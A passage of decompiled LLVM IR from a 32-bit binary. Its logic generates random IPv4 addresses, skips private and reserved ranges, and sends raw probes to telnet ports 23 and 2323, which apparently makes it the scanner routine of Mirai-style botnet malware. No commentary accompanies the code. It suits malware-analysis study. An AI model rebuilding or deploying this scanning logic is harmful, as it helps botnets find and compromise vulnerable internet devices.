  store i32 %v0_804f800, i32* @ebx, align 4
  ret i32 %v0_804f8c7

; uselistorder directives
  uselistorder i32 %v3_804f826, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 (i32, i32)* @function_8051cd0, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f8c3, { 1, 0 }
  uselistorder label %dec_label_pc_804f83a, { 1, 0 }
}

define i32 @function_805006e() local_unnamed_addr {
dec_label_pc_805006e:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %dec_label_pc_8050592

dec_label_pc_8050592:                             ; preds = %dec_label_pc_805057e, %dec_label_pc_805006e
  %v0_805006e = load i32, i32* @global_var_8056910.34, align 16
  store i32 %v0_805006e, i32* @esi, align 4
  %v0_8050074 = load i32, i32* @esp, align 4
  %v1_8050074 = add i32 %v0_8050074, 24
  %v2_8050074 = inttoptr i32 %v1_8050074 to i32*
  %v3_8050074 = load i32, i32* %v2_8050074, align 4
  %v15_8050074 = icmp eq i32 %v3_8050074, %v0_805006e
  br i1 %v15_8050074, label %dec_label_pc_805032d, label %dec_label_pc_805007e

dec_label_pc_805007e:                             ; preds = %dec_label_pc_8050592
  %v1_805007e = add i32 %v0_8050074, 1828
  store i32 %v1_805007e, i32* @ebp, align 4
  %v1_8050085 = add i32 %v0_8050074, 1868
  %v2_8050085 = inttoptr i32 %v1_8050085 to i32*
  store i32 0, i32* %v2_8050085, align 4
  %v0_8050233.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050233

dec_label_pc_8050095:                             ; preds = %dec_label_pc_80502a7
  %v11_8050095 = icmp eq i8 %v2_805028a, -84
  br i1 %v11_8050095, label %dec_label_pc_80502f2, label %dec_label_pc_805009e

dec_label_pc_805009e:                             ; preds = %dec_label_pc_8050095
  %v10_805009e = icmp eq i8 %v2_805028a, 100
  br i1 %v10_805009e, label %dec_label_pc_805009e.dec_label_pc_80502be_crit_edge, label %dec_label_pc_80500a7

dec_label_pc_805009e.dec_label_pc_80502be_crit_edge: ; preds = %dec_label_pc_805009e
  %.pre = trunc i32 %v2_8050281 to i8
  br label %dec_label_pc_80502be

dec_label_pc_80500a7:                             ; preds = %dec_label_pc_80502b5, %dec_label_pc_805009e
  %v11_80500a7 = icmp eq i8 %v2_805028a, -87
  br i1 %v11_80500a7, label %dec_label_pc_805030d, label %dec_label_pc_80500b0

dec_label_pc_80500b0:                             ; preds = %dec_label_pc_8050304, %dec_label_pc_80500a7
  %v0_80500b0 = phi i32 [ %v0_8050304, %dec_label_pc_8050304 ], [ %v5_805027f, %dec_label_pc_80500a7 ]
  %v0_805013869 = phi i32 [ %v0_80502fb, %dec_label_pc_8050304 ], [ %v2_8050281, %dec_label_pc_80500a7 ]
  %v1_80500b0 = trunc i32 %v0_80500b0 to i8
  %v11_80500b0 = icmp eq i8 %v1_80500b0, -58
  br i1 %v11_80500b0, label %dec_label_pc_80502d5, label %dec_label_pc_80500b9

dec_label_pc_80500b9:                             ; preds = %dec_label_pc_805030d, %dec_label_pc_80502cc, %dec_label_pc_80500b0
  %v0_80500b9 = phi i32 [ %v0_80500b976, %dec_label_pc_805030d ], [ %v5_805027f, %dec_label_pc_80502cc ], [ %v0_80500b0, %dec_label_pc_80500b0 ]
  %v0_805013868 = phi i32 [ %v0_805030d, %dec_label_pc_805030d ], [ %v2_8050281, %dec_label_pc_80502cc ], [ %v0_805013869, %dec_label_pc_80500b0 ]
  %v1_80500b9 = trunc i32 %v0_80500b9 to i8
  %tmp283 = icmp ult i8 %v1_80500b9, -32
  br i1 %tmp283, label %dec_label_pc_80500c2, label %dec_label_pc_8050274.preheader

dec_label_pc_80500c2:                             ; preds = %dec_label_pc_80502be, %dec_label_pc_80502f2.dec_label_pc_80500c2_crit_edge, %dec_label_pc_80502de, %dec_label_pc_80500b9, %dec_label_pc_80502d5
  %v0_8050138 = phi i32 [ %v0_80502fb, %dec_label_pc_80502f2.dec_label_pc_80500c2_crit_edge ], [ %v0_80502de, %dec_label_pc_80502de ], [ %v0_805013868, %dec_label_pc_80500b9 ], [ %v0_80502de, %dec_label_pc_80502d5 ], [ %v2_8050281, %dec_label_pc_80502be ]
  %v0_8050146 = phi i32 [ %v0_80500c2.pre, %dec_label_pc_80502f2.dec_label_pc_80500c2_crit_edge ], [ %v0_80500c265, %dec_label_pc_80502de ], [ %v0_80500b9, %dec_label_pc_80500b9 ], [ %v0_80500c265, %dec_label_pc_80502d5 ], [ %v5_805027f, %dec_label_pc_80502be ]
  %v1_80500c2 = add i32 %v0_8050146, -6
  store i32 %v1_80500c2, i32* %eax.global-to-local, align 4
  %v1_80500c5 = trunc i32 %v1_80500c2 to i8
  %tmp284 = or i8 %v1_80500c5, 1
  %tmp285 = icmp eq i8 %tmp284, 1
  br i1 %tmp285, label %dec_label_pc_8050274.preheader, label %dec_label_pc_80500cd

dec_label_pc_80500cd:                             ; preds = %dec_label_pc_80500c2
  %v1_80500cd = trunc i32 %v0_8050146 to i8
  %v10_80500cd = icmp eq i8 %v1_80500cd, 11
  br i1 %v10_80500cd, label %dec_label_pc_8050274.preheader, label %dec_label_pc_80500d6

dec_label_pc_80500d6:                             ; preds = %dec_label_pc_80500cd
  %v10_80500d6 = icmp eq i8 %v1_80500cd, 21
  br i1 %v10_80500d6, label %dec_label_pc_8050274.preheader, label %dec_label_pc_80500df

dec_label_pc_80500df:                             ; preds = %dec_label_pc_80500d6
  %v10_80500df = icmp eq i8 %v1_80500cd, 22
  br i1 %v10_80500df, label %dec_label_pc_8050274.preheader, label %dec_label_pc_80500e8

dec_label_pc_80500e8:                             ; preds = %dec_label_pc_80500df
  %v10_80500e8 = icmp eq i8 %v1_80500cd, 26
  br i1 %v10_80500e8, label %dec_label_pc_8050274.preheader, label %dec_label_pc_80500f1

dec_label_pc_80500f1:                             ; preds = %dec_label_pc_80500e8
  %v10_80500f1 = icmp eq i8 %v1_80500cd, 28
  br i1 %v10_80500f1, label %dec_label_pc_8050274.preheader, label %dec_label_pc_80500fa

dec_label_pc_80500fa:                             ; preds = %dec_label_pc_80500f1
  %v10_80500fa = icmp eq i8 %v1_80500cd, 29
  br i1 %v10_80500fa, label %dec_label_pc_8050274.preheader, label %dec_label_pc_8050103

dec_label_pc_8050103:                             ; preds = %dec_label_pc_80500fa
  %v10_8050103 = icmp eq i8 %v1_80500cd, 30
  br i1 %v10_8050103, label %dec_label_pc_8050274.preheader, label %dec_label_pc_805010c

dec_label_pc_805010c:                             ; preds = %dec_label_pc_8050103
  %v10_805010c = icmp eq i8 %v1_80500cd, 33
  br i1 %v10_805010c, label %dec_label_pc_8050274.preheader, label %dec_label_pc_8050115

dec_label_pc_8050115:                             ; preds = %dec_label_pc_805010c
  %v10_8050115 = icmp eq i8 %v1_80500cd, 55
  br i1 %v10_8050115, label %dec_label_pc_8050274.preheader, label %dec_label_pc_805011e

dec_label_pc_805011e:                             ; preds = %dec_label_pc_8050115
  %v11_805011e = icmp eq i8 %v1_80500cd, -42
  br i1 %v11_805011e, label %dec_label_pc_8050274.preheader, label %dec_label_pc_8050127

dec_label_pc_8050127:                             ; preds = %dec_label_pc_805011e
  %v11_8050127 = icmp eq i8 %v1_80500cd, -41
  br i1 %v11_8050127, label %dec_label_pc_8050274.preheader, label %dec_label_pc_8050130

dec_label_pc_8050130:                             ; preds = %dec_label_pc_8050127
  %v0_8050132 = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_80568ea.35 to i16*), align 4
  %v1_8050138 = mul i32 %v0_8050138, 65536
  %v2_8050143 = and i32 %v1_8050138, 16711680
  %v2_8050146 = mul i32 %v0_8050146, 16777216
  %v1_8050132 = mul i32 %v0_8050132, 256
  %v2_805014c = or i32 %v2_8050143, %v2_8050146
  %v0_805014e = load i32, i32* @edi, align 4
  %v1_8050150 = urem i32 %v0_805014e, 256
  store i32 %v1_8050150, i32* %eax.global-to-local, align 4
  %v2_8050155 = or i32 %v1_8050150, %v2_805014c
  store i32 %v2_8050155, i32* %ecx.global-to-local, align 4
  %v2_8050157 = or i32 %v1_8050150, %v1_8050132
  %v1_8050159 = load i32, i32* @esp, align 4
  %v2_8050159 = add i32 %v1_8050159, -4
  %v3_8050159 = inttoptr i32 %v2_8050159 to i32*
  store i32 %v2_8050155, i32* %v3_8050159, align 4
  %v1_805015a = trunc i32 %v2_8050157 to i16
  %v2_805015a = call i16 @llvm.bswap.i16(i16 %v1_805015a)
  %v3_805015a = zext i16 %v2_805015a to i32
  %v1_805015e = udiv i32 %v2_805014c, 65536
  %v2_805015e = mul nuw i32 %v3_805015a, 65536
  %v1_8050161 = trunc i32 %v1_805015e to i16
  %v2_8050161 = call i16 @llvm.bswap.i16(i16 %v1_8050161)
  %v3_8050161 = zext i16 %v2_8050161 to i32
  %v6_8050161 = or i32 %v2_805015e, %v3_8050161
  store i32 %v6_8050161, i32* %edx.global-to-local, align 4
  %v0_8050165 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050165 = add i32 %v1_8050159, -8
  %v3_8050165 = inttoptr i32 %v2_8050165 to i32*
  store i32 %v0_8050165, i32* %v3_8050165, align 4
  %v0_8050166 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8050166, i32* @global_var_80568f0.36, align 16
  %v1_805016c = add i32 %v1_8050159, -12
  %v2_805016c = inttoptr i32 %v1_805016c to i32*
  store i32 20, i32* %v2_805016c, align 4
  %v1_805016e = add i32 %v1_8050159, -16
  %v2_805016e = inttoptr i32 %v1_805016e to i32*
  store i32 ptrtoint (i32* @global_var_80568e0.37 to i32), i32* %v2_805016e, align 4
  %v0_8050173 = call i32 @function_804d4b0()
  %v1_8050173 = trunc i32 %v0_8050173 to i16
  store i32 %v0_8050173, i32* %eax.global-to-local, align 4
  %v0_8050178 = load i32, i32* @esp, align 4
  %v1_8050178 = add i32 %v0_8050178, 1884
  %v2_8050178 = inttoptr i32 %v1_8050178 to i32*
  %v3_8050178 = load i32, i32* %v2_8050178, align 4
  store i16 %v1_8050173, i16* bitcast (i32* @global_var_80568ea.35 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_805018e = ashr i32 %v3_8050178, 31
  %v2_8050194 = zext i32 %v3_8050178 to i64
  %v4_8050194 = zext i32 %v2_805018e to i64
  %v5_8050194 = mul nuw i64 %v4_8050194, 4294967296
  %v6_8050194 = or i64 %v5_8050194, %v2_8050194
  %v10_8050194 = srem i64 %v6_8050194, 10
  %v11_8050194 = trunc i64 %v10_8050194 to i32
  store i32 %v11_8050194, i32* %edx.global-to-local, align 4
  %v1_8050196 = icmp eq i32 %v11_8050194, 0
  %v1_8050198 = icmp eq i1 %v1_8050196, false
  %. = select i1 %v1_8050198, i16 5888, i16 4873
  store i16 %., i16* @global_var_80568f6.38, align 2
  %v0_80501a7 = load i32, i32* @global_var_80568f0.36, align 16
  store i32 %v0_80501a7, i32* %eax.global-to-local, align 4
  %v1_80501ac = add i32 %v0_8050178, 12
  %v2_80501ac = inttoptr i32 %v1_80501ac to i32*
  store i32 20, i32* %v2_80501ac, align 4
  %v0_80501ae = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80501ae, i32* @global_var_80568f8.39, align 8
  %v1_80501b3 = add i32 %v0_8050178, 8
  %v2_80501b3 = inttoptr i32 %v1_80501b3 to i32*
  store i32 5120, i32* %v2_80501b3, align 4
  store i16 0, i16* bitcast (i32* @global_var_8056904.40 to i16*), align 4
  %v1_80501c1 = add i32 %v0_8050178, 4
  %v2_80501c1 = inttoptr i32 %v1_80501c1 to i32*
  store i32 ptrtoint (i32* @global_var_80568f4.41 to i32), i32* %v2_80501c1, align 4
  %v2_80501c6 = inttoptr i32 %v0_8050178 to i32*
  store i32 ptrtoint (i32* @global_var_80568e0.37 to i32), i32* %v2_80501c6, align 4
  %v0_80501cb = call i32 @function_804d500()
  %v1_80501cb = trunc i32 %v0_80501cb to i16
  store i16 %v1_80501cb, i16* bitcast (i32* @global_var_8056904.40 to i16*), align 4
  %v0_80501d6 = load i32, i32* @global_var_80568f0.36, align 16
  store i32 %v0_80501d6, i32* %eax.global-to-local, align 4
  %v1_80501db = load i32, i32* @esp, align 4
  %v2_80501db = add i32 %v1_80501db, 1848
  %v3_80501db = inttoptr i32 %v2_80501db to i32*
  store i32 %v0_80501d6, i32* %v3_80501db, align 4
  %v0_80501e2 = load i16, i16* @global_var_80568f6.38, align 2
  %v1_80501e2 = zext i16 %v0_80501e2 to i32
  %v2_80501e2 = load i32, i32* %eax.global-to-local, align 4
  %v3_80501e2 = and i32 %v2_80501e2, -65536
  %v4_80501e2 = or i32 %v3_80501e2, %v1_80501e2
  store i32 %v4_80501e2, i32* %eax.global-to-local, align 4
  %v0_80501e8 = load i32, i32* @esp, align 4
  %v1_80501e8 = add i32 %v0_80501e8, 1844
  %v2_80501e8 = inttoptr i32 %v1_80501e8 to i16*
  store i16 2, i16* %v2_80501e8, align 2
  %v0_80501f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501f2 = trunc i32 %v0_80501f2 to i16
  %v2_80501f2 = load i32, i32* @esp, align 4
  %v3_80501f2 = add i32 %v2_80501f2, 1846
  %v4_80501f2 = inttoptr i32 %v3_80501f2 to i16*
  store i16 %v1_80501f2, i16* %v4_80501f2, align 2
  %v0_80501fa = load i32, i32* @esp, align 4
  %v1_80501fa = inttoptr i32 %v0_80501fa to i32*
  %v3_80501fa = add i32 %v0_80501fa, 4
  %v0_80501fb = load i32, i32* @global_var_805695c.42, align 4
  store i32 %v0_80501fb, i32* %eax.global-to-local, align 4
  %v1_8050200 = inttoptr i32 %v3_80501fa to i32*
  %v2_8050200 = load i32, i32* %v1_8050200, align 4
  store i32 %v2_8050200, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_8050200, align 4
  %v0_8050203 = load i32, i32* @ebp, align 4
  store i32 %v0_8050203, i32* %v1_80501fa, align 4
  %v1_8050204 = add i32 %v0_80501fa, -4
  %v2_8050204 = inttoptr i32 %v1_8050204 to i32*
  store i32 16384, i32* %v2_8050204, align 4
  %v1_8050209 = add i32 %v0_80501fa, -8
  %v2_8050209 = inttoptr i32 %v1_8050209 to i32*
  store i32 40, i32* %v2_8050209, align 4
  %v1_805020b = add i32 %v0_80501fa, -12
  %v2_805020b = inttoptr i32 %v1_805020b to i32*
  store i32 ptrtoint (i32* @global_var_80568e0.37 to i32), i32* %v2_805020b, align 4
  %v0_8050210 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050210 = add i32 %v0_80501fa, -16
  %v3_8050210 = inttoptr i32 %v2_8050210 to i32*
  store i32 %v0_8050210, i32* %v3_8050210, align 4
  %v0_8050211 = call i32 @function_8052957()
  store i32 %v0_8050211, i32* %eax.global-to-local, align 4
  %v0_8050216 = load i32, i32* @esp, align 4
  %v1_8050216 = add i32 %v0_8050216, 1900
  %v2_8050216 = inttoptr i32 %v1_8050216 to i32*
  %v3_8050216 = load i32, i32* %v2_8050216, align 4
  %v1_805021d = add i32 %v3_8050216, 1
  store i32 %v1_805021d, i32* %eax.global-to-local, align 4
  store i32 %v1_805021d, i32* %v2_8050216, align 4
  %v0_8050225 = load i32, i32* @esp, align 4
  %v1_8050225 = add i32 %v0_8050225, 32
  %v0_8050228 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050228 = add i32 %v0_8050228, -159
  %v6_8050228 = sub i32 158, %v0_8050228
  %v7_8050228 = and i32 %v6_8050228, %v0_8050228
  %v8_8050228 = icmp slt i32 %v7_8050228, 0
  %v9_8050228 = icmp eq i32 %v1_8050228, 0
  %v10_8050228 = icmp slt i32 %v1_8050228, 0
  %v3_805022d = icmp eq i1 %v10_8050228, %v8_8050228
  %v4_805022d = icmp eq i1 %v9_8050228, false
  %v5_805022d = and i1 %v4_805022d, %v3_805022d
  br i1 %v5_805022d, label %dec_label_pc_8050329, label %dec_label_pc_8050233

dec_label_pc_8050233:                             ; preds = %dec_label_pc_8050130, %dec_label_pc_805007e
  %v0_8050233 = phi i32 [ %v1_8050225, %dec_label_pc_8050130 ], [ %v0_8050233.pre, %dec_label_pc_805007e ]
  %v1_8050233 = add i32 %v0_8050233, 1828
  %v2_8050233 = inttoptr i32 %v1_8050233 to i32*
  store i32 0, i32* %v2_8050233, align 4
  %v0_805023e = load i32, i32* @esp, align 4
  %v1_805023e = add i32 %v0_805023e, 1832
  %v2_805023e = inttoptr i32 %v1_805023e to i32*
  store i32 0, i32* %v2_805023e, align 4
  %v0_8050249 = load i32, i32* @esp, align 4
  %v1_8050249 = add i32 %v0_8050249, 1836
  %v2_8050249 = inttoptr i32 %v1_8050249 to i32*
  store i32 0, i32* %v2_8050249, align 4
  %v0_8050254 = load i32, i32* @esp, align 4
  %v1_8050254 = add i32 %v0_8050254, 1840
  %v2_8050254 = inttoptr i32 %v1_8050254 to i32*
  store i32 0, i32* %v2_8050254, align 4
  %v1_805025f = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_805025f = trunc i32 %v1_805025f to i16
  store i16 %v2_805025f, i16* bitcast (i32* @global_var_80568e4.43 to i16*), align 4
  %v0_805026a = load i32, i32* @global_var_805693c.27, align 4
  store i32 %v0_805026a, i32* %eax.global-to-local, align 4
  store i32 %v0_805026a, i32* @global_var_80568ec.44, align 4
  br label %dec_label_pc_8050274.preheader

dec_label_pc_8050274.preheader:                   ; preds = %dec_label_pc_8050233, %dec_label_pc_80500c2, %dec_label_pc_80500cd, %dec_label_pc_80500d6, %dec_label_pc_80500df, %dec_label_pc_80500e8, %dec_label_pc_80500f1, %dec_label_pc_80500fa, %dec_label_pc_8050103, %dec_label_pc_805010c, %dec_label_pc_8050115, %dec_label_pc_805011e, %dec_label_pc_8050127, %dec_label_pc_80502de, %dec_label_pc_80502fb, %dec_label_pc_80500b9, %dec_label_pc_805030d
  br label %dec_label_pc_8050274

dec_label_pc_8050274:                             ; preds = %dec_label_pc_80502c7, %dec_label_pc_80502b0, %dec_label_pc_80502a2, %dec_label_pc_805029d, %dec_label_pc_8050296, %dec_label_pc_8050292, %dec_label_pc_805028e, %dec_label_pc_8050274, %dec_label_pc_8050274.preheader
  %v1_8050274 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050274, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_8050274, 65536
  %v1_8050279 = sdiv i32 %sext, 65536
  %v2_805027f = urem i32 %v1_8050274, 256
  %v3_805027f = load i32, i32* @ecx, align 4
  %v4_805027f = and i32 %v3_805027f, -256
  %v5_805027f = or i32 %v4_805027f, %v2_805027f
  store i32 %v5_805027f, i32* @ecx, align 4
  %v2_8050281 = udiv i32 %v1_8050279, 256
  store i32 %v2_8050281, i32* @ebx, align 4
  %v2_8050284 = udiv i32 %v1_8050279, 65536
  store i32 %v2_8050284, i32* @edx, align 4
  %v2_8050287 = udiv i32 %v1_8050279, 16777216
  store i32 %v2_8050287, i32* @edi, align 4
  %v2_805028a = trunc i32 %v1_8050274 to i8
  %v11_805028a = icmp eq i8 %v2_805028a, 127
  br i1 %v11_805028a, label %dec_label_pc_8050274, label %dec_label_pc_805028e

dec_label_pc_805028e:                             ; preds = %dec_label_pc_8050274
  %v6_805028e = icmp eq i8 %v2_805028a, 0
  br i1 %v6_805028e, label %dec_label_pc_8050274, label %dec_label_pc_8050292

dec_label_pc_8050292:                             ; preds = %dec_label_pc_805028e
  %v11_8050292 = icmp eq i8 %v2_805028a, 3
  br i1 %v11_8050292, label %dec_label_pc_8050274, label %dec_label_pc_8050296

dec_label_pc_8050296:                             ; preds = %dec_label_pc_8050292
  %v2_8050296 = add nsw i32 %v1_8050279, -15
  store i32 %v2_8050296, i32* %eax.global-to-local, align 4
  %v1_8050299 = trunc i32 %v2_8050296 to i8
  %tmp286 = or i8 %v1_8050299, 1
  %tmp287 = icmp eq i8 %tmp286, 1
  br i1 %tmp287, label %dec_label_pc_8050274, label %dec_label_pc_805029d

dec_label_pc_805029d:                             ; preds = %dec_label_pc_8050296
  %v10_805029d = icmp eq i8 %v2_805028a, 56
  br i1 %v10_805029d, label %dec_label_pc_8050274, label %dec_label_pc_80502a2

dec_label_pc_80502a2:                             ; preds = %dec_label_pc_805029d
  %v10_80502a2 = icmp eq i8 %v2_805028a, 10
  br i1 %v10_80502a2, label %dec_label_pc_8050274, label %dec_label_pc_80502a7

dec_label_pc_80502a7:                             ; preds = %dec_label_pc_80502a2
  %v8_80502a7 = icmp eq i8 %v2_805028a, -64
  %v1_80502aa = icmp eq i1 %v8_80502a7, false
  br i1 %v1_80502aa, label %dec_label_pc_8050095, label %dec_label_pc_80502b0

dec_label_pc_80502b0:                             ; preds = %dec_label_pc_80502a7
  %v1_80502b0 = trunc i32 %v2_8050281 to i8
  %v11_80502b0 = icmp eq i8 %v1_80502b0, -88
  br i1 %v11_80502b0, label %dec_label_pc_8050274, label %dec_label_pc_80502b5

dec_label_pc_80502b5:                             ; preds = %dec_label_pc_80502b0
  %v10_80502b5 = icmp eq i8 %v2_805028a, 100
  %v1_80502b8 = icmp eq i1 %v10_80502b5, false
  br i1 %v1_80502b8, label %dec_label_pc_80500a7, label %dec_label_pc_80502be

dec_label_pc_80502be:                             ; preds = %dec_label_pc_805009e.dec_label_pc_80502be_crit_edge, %dec_label_pc_80502b5
  %v1_80502be.pre-phi = phi i8 [ %.pre, %dec_label_pc_805009e.dec_label_pc_80502be_crit_edge ], [ %v1_80502b0, %dec_label_pc_80502b5 ]
  %tmp288 = icmp ult i8 %v1_80502be.pre-phi, 64
  br i1 %tmp288, label %dec_label_pc_80500c2, label %dec_label_pc_80502c7

dec_label_pc_80502c7:                             ; preds = %dec_label_pc_80502be
  %tmp289 = icmp ult i8 %v1_80502be.pre-phi, 127
  br i1 %tmp289, label %dec_label_pc_8050274, label %dec_label_pc_80502cc

dec_label_pc_80502cc:                             ; preds = %dec_label_pc_80502c7
  %v11_80502cc = icmp eq i8 %v2_805028a, -58
  %v1_80502cf = icmp eq i1 %v11_80502cc, false
  br i1 %v1_80502cf, label %dec_label_pc_80500b9, label %dec_label_pc_80502d5

dec_label_pc_80502d5:                             ; preds = %dec_label_pc_80502cc, %dec_label_pc_80500b0
  %v0_80502de = phi i32 [ %v2_8050281, %dec_label_pc_80502cc ], [ %v0_805013869, %dec_label_pc_80500b0 ]
  %v0_80500c265 = phi i32 [ %v5_805027f, %dec_label_pc_80502cc ], [ %v0_80500b0, %dec_label_pc_80500b0 ]
  %v1_80502d5 = trunc i32 %v0_80502de to i8
  %tmp290 = icmp ult i8 %v1_80502d5, 18
  br i1 %tmp290, label %dec_label_pc_80500c2, label %dec_label_pc_80502de

dec_label_pc_80502de:                             ; preds = %dec_label_pc_80502d5
  %tmp291 = or i8 %v1_80502d5, 1
  %tmp292 = icmp eq i8 %tmp291, 19
  br i1 %tmp292, label %dec_label_pc_8050274.preheader, label %dec_label_pc_80500c2

dec_label_pc_80502e8:                             ; preds = %dec_label_pc_8051085
  store i32 0, i32* %v2_80502eb, align 4
  %v1_80502ed = call i32 @function_8053d29(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80502ed, i32* %eax.global-to-local, align 4
  %v0_80502f2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80502f2

dec_label_pc_80502f2:                             ; preds = %dec_label_pc_8050095, %dec_label_pc_80502e8
  %v0_80502fb = phi i32 [ %v0_80502f2.pre, %dec_label_pc_80502e8 ], [ %v2_8050281, %dec_label_pc_8050095 ]
  %v1_80502f2 = trunc i32 %v0_80502fb to i8
  %tmp293 = icmp ult i8 %v1_80502f2, 16
  br i1 %tmp293, label %dec_label_pc_80502f2.dec_label_pc_80500c2_crit_edge, label %dec_label_pc_80502fb

dec_label_pc_80502f2.dec_label_pc_80500c2_crit_edge: ; preds = %dec_label_pc_80502f2
  %v0_80500c2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80500c2

dec_label_pc_80502fb:                             ; preds = %dec_label_pc_80502f2
  %tmp294 = icmp ult i8 %v1_80502f2, 32
  br i1 %tmp294, label %dec_label_pc_8050274.preheader, label %dec_label_pc_8050304

dec_label_pc_8050304:                             ; preds = %dec_label_pc_80502fb
  %v0_8050304 = load i32, i32* @ecx, align 4
  %v1_8050304 = trunc i32 %v0_8050304 to i8
  %v11_8050304 = icmp eq i8 %v1_8050304, -87
  %v1_8050307 = icmp eq i1 %v11_8050304, false
  br i1 %v1_8050307, label %dec_label_pc_80500b0, label %dec_label_pc_805030d

dec_label_pc_805030d:                             ; preds = %dec_label_pc_8050304, %dec_label_pc_80500a7
  %v0_80500b976 = phi i32 [ %v0_8050304, %dec_label_pc_8050304 ], [ %v5_805027f, %dec_label_pc_80500a7 ]
  %v0_805030d = phi i32 [ %v0_80502fb, %dec_label_pc_8050304 ], [ %v2_8050281, %dec_label_pc_80500a7 ]
  %v1_805030d = trunc i32 %v0_805030d to i8
  %v11_805030d = icmp eq i8 %v1_805030d, -1
  %v1_8050310 = icmp eq i1 %v11_805030d, false
  br i1 %v1_8050310, label %dec_label_pc_80500b9, label %dec_label_pc_8050274.preheader

dec_label_pc_8050329:                             ; preds = %dec_label_pc_8050130
  %v0_8050329 = load i32, i32* @esi, align 4
  %v2_8050329 = add i32 %v0_8050225, 56
  %v3_8050329 = inttoptr i32 %v2_8050329 to i32*
  store i32 %v0_8050329, i32* %v3_8050329, align 4
  br label %dec_label_pc_805032d

dec_label_pc_805032d:                             ; preds = %dec_label_pc_8050592, %dec_label_pc_8050329
  %v1_805032d = call i32 @function_8052719(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_805032d, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8050334 = load i32, i32* @esp, align 4
  %v2_8050334 = add i32 %v1_8050334, 40
  %v3_8050334 = inttoptr i32 %v2_8050334 to i32*
  store i32 %v1_805032d, i32* %v3_8050334, align 4
  br label %dec_label_pc_8050338

dec_label_pc_8050338:                             ; preds = %dec_label_pc_80503d5, %dec_label_pc_80503cd, %dec_label_pc_80503c5, %dec_label_pc_80503bd, %dec_label_pc_80503b1, %dec_label_pc_80503a5, %dec_label_pc_805039e, %dec_label_pc_805038c, %dec_label_pc_8050380, %dec_label_pc_805037b, %dec_label_pc_8050434, %dec_label_pc_805032d
  %v0_8050338 = load i32, i32* @esp, align 4
  %v1_8050338 = add i32 %v0_8050338, 40
  %v2_8050338 = inttoptr i32 %v1_8050338 to i32*
  %v3_8050338 = load i32, i32* %v2_8050338, align 4
  store i32 %v3_8050338, i32* %eax.global-to-local, align 4
  %v1_805033c = inttoptr i32 %v3_8050338 to i32*
  store i32 0, i32* %v1_805033c, align 4
  %v0_8050342 = load i32, i32* @edi, align 4
  %v1_8050342 = load i32, i32* @esp, align 4
  %v2_8050342 = add i32 %v1_8050342, -4
  %v3_8050342 = inttoptr i32 %v2_8050342 to i32*
  store i32 %v0_8050342, i32* %v3_8050342, align 4
  %v0_8050343 = load i32, i32* @edi, align 4
  %v2_8050343 = add i32 %v1_8050342, -8
  %v3_8050343 = inttoptr i32 %v2_8050343 to i32*
  store i32 %v0_8050343, i32* %v3_8050343, align 4
  %v1_8050344 = add i32 %v1_8050342, -12
  %v2_8050344 = inttoptr i32 %v1_8050344 to i32*
  store i32 0, i32* %v2_8050344, align 4
  %v1_8050346 = add i32 %v1_8050342, -16
  %v2_8050346 = inttoptr i32 %v1_8050346 to i32*
  store i32 0, i32* %v2_8050346, align 4
  %v1_8050348 = add i32 %v1_8050342, -20
  %v2_8050348 = inttoptr i32 %v1_8050348 to i32*
  store i32 16384, i32* %v2_8050348, align 4
  %v1_805034d = add i32 %v1_8050342, -24
  %v2_805034d = inttoptr i32 %v1_805034d to i32*
  store i32 1514, i32* %v2_805034d, align 4
  %v0_8050352 = load i32, i32* @global_var_805695c.42, align 4
  store i32 %v0_8050352, i32* %esi.global-to-local, align 4
  %v1_8050358 = add i32 %v1_8050342, 58
  store i32 %v1_8050358, i32* %edx.global-to-local, align 4
  %v2_805035c = add i32 %v1_8050342, -28
  %v3_805035c = inttoptr i32 %v2_805035c to i32*
  store i32 %v1_8050358, i32* %v3_805035c, align 4
  %v0_805035d = load i32, i32* %esi.global-to-local, align 4
  %v2_805035d = add i32 %v1_8050342, -32
  %v3_805035d = inttoptr i32 %v2_805035d to i32*
  store i32 %v0_805035d, i32* %v3_805035d, align 4
  %v0_805035e = call i32 @function_80528e1()
  store i32 %v0_805035e, i32* %eax.global-to-local, align 4
  %v0_8050363 = load i32, i32* @esp, align 4
  %tmp = icmp slt i32 %v0_805035e, 1
  br i1 %tmp, label %dec_label_pc_8050445, label %dec_label_pc_805036e

dec_label_pc_805036e:                             ; preds = %dec_label_pc_8050338
  %v1_805036e = add i32 %v0_8050363, 72
  %v2_805036e = inttoptr i32 %v1_805036e to i32*
  %v3_805036e = load i32, i32* %v2_805036e, align 4
  store i32 %v3_805036e, i32* %ecx.global-to-local, align 4
  %v1_8050372 = inttoptr i32 %v3_805036e to i32*
  %v2_8050372 = load i32, i32* %v1_8050372, align 4
  %v11_8050372 = icmp eq i32 %v2_8050372, 11
  br i1 %v11_8050372, label %dec_label_pc_8050445, label %dec_label_pc_805037b

dec_label_pc_805037b:                             ; preds = %dec_label_pc_805036e
  %tmp295 = icmp ult i32 %v0_805035e, 40
  br i1 %tmp295, label %dec_label_pc_8050338, label %dec_label_pc_8050380

dec_label_pc_8050380:                             ; preds = %dec_label_pc_805037b
  %v1_8050380 = add i32 %v0_8050363, 106
